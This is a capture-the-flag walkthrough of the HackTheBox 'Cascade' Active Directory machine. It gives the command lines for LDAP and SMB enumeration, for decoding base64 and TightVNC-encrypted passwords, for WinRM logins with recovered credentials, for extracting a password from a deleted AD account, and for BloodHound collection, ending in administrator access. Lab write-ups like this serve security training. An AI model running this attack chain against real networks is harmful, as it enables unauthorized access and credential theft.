---
icon: windows
---

# Cascade - Medium

<figure><img src="../../.gitbook/assets/image (1163).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/cascade"><strong>Cascade</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.182 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 12:45 EDT
Nmap scan report for cascade.local (10.10.10.182)
Host is up (0.039s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-28 16:47:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-28T16:48:52
|_  start_date: 2025-09-28T16:18:31
|_clock-skew: 2s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   54.60 ms 10.10.16.1
2   54.64 ms cascade.local (10.10.10.182)
```

The ldap scan shows the domain name of cascade.local. I'll add it and to my /etc/hosts/ file

```
10.10.10.182	cascade.local
```

### <mark style="color:$primary;">Ldap Enumeration</mark>

```
ldapsearch -x -H ldap://cascade.local:389 -b "DC=cascade,DC=local" > ldap.out
```

While Going through the ldap output I come across something that looks like a base64 encoded password for the r.thompson user

<figure><img src="../../.gitbook/assets/image (1164).png" alt=""><figcaption></figcaption></figure>

I am going to try decoding and test to see if it works

```
echo 'clk0bjVldmE=' | base64 -d
```

<figure><img src="../../.gitbook/assets/image (1165).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1167).png" alt=""><figcaption></figcaption></figure>

It works! Now we have a user, let's checkout the Data share

```
smbclient \\\\10.10.10.182\\Data -U 'r.thompson%rY4n5eva'
```

<figure><img src="../../.gitbook/assets/image (1168).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1169).png" alt=""><figcaption></figcaption></figure>

I am going to checkout that file&#x20;

<figure><img src="../../.gitbook/assets/image (1170).png" alt=""><figcaption></figcaption></figure>

That Note was writen by s.smith. I’ll keep an eye out for the admin account password and TempAdmin. Let's checkout that VNC Install registry file

<figure><img src="../../.gitbook/assets/image (1174).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking TightVNC Password</mark>

That password line looks interesting, I had to do some research on this. TightVNC shows that it stores the password in the registery encrypted with a static key. I am going to use [this](https://github.com/jeroennijhof/vncpwd) tool to decrypt it. It takes a file with the ciphertext, which I created with the following command:

```
echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
```

<figure><img src="../../.gitbook/assets/image (1175).png" alt=""><figcaption></figcaption></figure>

Now to decrypt it

<figure><img src="../../.gitbook/assets/image (1176).png" alt=""><figcaption></figcaption></figure>

Since we found this in s.smith's directory let's see what he can do

netexec winrm cascade.local -u s.smith -p sT333ve2

<figure><img src="../../.gitbook/assets/image (1177).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1178).png" alt=""><figcaption></figcaption></figure>

Now we have a shell as s.smith!

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Enumeration as s.smith</mark>

<figure><img src="../../.gitbook/assets/image (1179).png" alt=""><figcaption></figcaption></figure>

s.smith is a memeber of the <mark style="color:$info;">**Audit Share**</mark> group, that is not a standard group, so I'll check it out

<figure><img src="../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>

s.smith is the only user in the group, but the comment is a useful hint to look at this share. There’s a `c:\shares\`, but I don’t have permissions to list the directories in it:

<figure><img src="../../.gitbook/assets/image (1181).png" alt=""><figcaption></figcaption></figure>

I do have access however to the audit share itself!

<figure><img src="../../.gitbook/assets/image (1182).png" alt=""><figcaption></figcaption></figure>

I am going to access this share from my machine and copy all the files there for further enumeration

<figure><img src="../../.gitbook/assets/image (1183).png" alt=""><figcaption></figcaption></figure>

```
smbclient \\\\10.10.10.182\\Audit$ -U 's.smith%sT333ve2'
```

<figure><img src="../../.gitbook/assets/image (1184).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerating DB file</mark>

<figure><img src="../../.gitbook/assets/image (1185).png" alt=""><figcaption></figcaption></figure>

There is a database SQLite3 file, I am going to use SQLite Browser to check it out.&#x20;

<figure><img src="../../.gitbook/assets/image (1191).png" alt=""><figcaption></figcaption></figure>

After enumerating the file, I found a password I cannot decrypt for the ArkSvc user. I decided to move to the CascAudit.exe program.

### <mark style="color:$primary;">CascAudit.exe</mark>

<figure><img src="../../.gitbook/assets/image (1186).png" alt=""><figcaption></figcaption></figure>

<mark style="color:$info;">**RunAudit.bat**</mark> shows that <mark style="color:$info;">**CascAudit.exe**</mark> is run with the db file as an argument

<figure><img src="../../.gitbook/assets/image (1187).png" alt=""><figcaption></figcaption></figure>

It's a .NET binary, I will have to copy it to my Windows VM and use [**DNSpy**](https://github.com/dnSpy/dnSpy) to take a look at it. In the MailModule, there’s this code:

#### <mark style="color:$primary;">DNSpy</mark>

<figure><img src="../../.gitbook/assets/image (1188).png" alt=""><figcaption></figcaption></figure>

It is opening an SQLite connection to the database passed as an arg, reading from the LDAP table, and decrypting the password

I decided to recover the plaintext password by debugging. I put a breakpoint on line 53 where the SQL connection is closed. Then I went Debug -> Start Debugging…, and set the Arugument to where I had a copy of Audit.db:

<figure><img src="../../.gitbook/assets/image (1189).png" alt=""><figcaption></figcaption></figure>

On hitting OK, it runs to the breakpoint, and I can see the decrypted password in the Locals window:

<figure><img src="../../.gitbook/assets/image (1190).png" alt=""><figcaption></figcaption></figure>

Based on the line in the SQLite DB, this password, "w3lc0meFr31nd", likepy pairs with the account arksvc

<figure><img src="../../.gitbook/assets/image (1192).png" alt=""><figcaption></figcaption></figure>

Nice it works! Let's login as arksvc and see what he can do

<figure><img src="../../.gitbook/assets/image (1193).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumeration as arksvc</mark>

<figure><img src="../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>

I found another unusual group! Time to do some research:

### <mark style="color:$primary;">AD Recycle</mark>

<mark style="color:$info;">**AD Recycle Bin**</mark> is a well-know Windows group. [Active Directory Object Recovery (or Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files. The linked article gives a PowerShell command to query all of the deleted objects within a domain:

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

<figure><img src="../../.gitbook/assets/image (1195).png" alt=""><figcaption></figcaption></figure>

The last one is really interesting, because it’s the temporary administer account mentioned in the old email I found earlier \[which also said it was using the same password as the normal admin account]. I am going to get all the details for that account:

```
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

<figure><img src="../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

Immediately <mark style="color:$success;">**cascadeLegacyPwd**</mark>  jumps out. I am going to decode it

```
echo YmFDVDNyMWFOMDBkbGVz | base64 -d
```

<figure><img src="../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

We should be able to use this password to login as the admin user!

```
evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles
```

<figure><img src="../../.gitbook/assets/image (1198).png" alt=""><figcaption></figcaption></figure>

We are admin! This box was enumeration heavy! In the beginning after getting r.thompson's creds I did lose some extra time by running bloodhound at first, it did help me paint a bigger picture on what I am supposed to though. I will add it below for reference

I am going to keep that in mind and I am going to perform bloodhound collection using netexec and further enumerate the users.

### <mark style="color:$primary;">Bloodhound</mark>

```
netexec ldap 10.10.10.182 -u r.thompson -p rY4n5eva --bloodhound --collection All --dns-server 10.10.10.182
```

<figure><img src="../../.gitbook/assets/image (1199).png" alt=""><figcaption></figcaption></figure>

I am going to start bloodhound and take a look:

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (1171).png" alt=""><figcaption></figcaption></figure>

r.thompson is in the IT group. Let's see who else is in there

<figure><img src="../../.gitbook/assets/image (1172).png" alt=""><figcaption></figcaption></figure>

The group contains 2 new interesting members. I will keep these targets in mind I am more interested in arksvc!

<figure><img src="../../.gitbook/assets/image (1173).png" alt=""><figcaption></figcaption></figure>

arksvc's is part of the remote management group & AD Recycle Bin group, very unusual group I will keep that in mind!
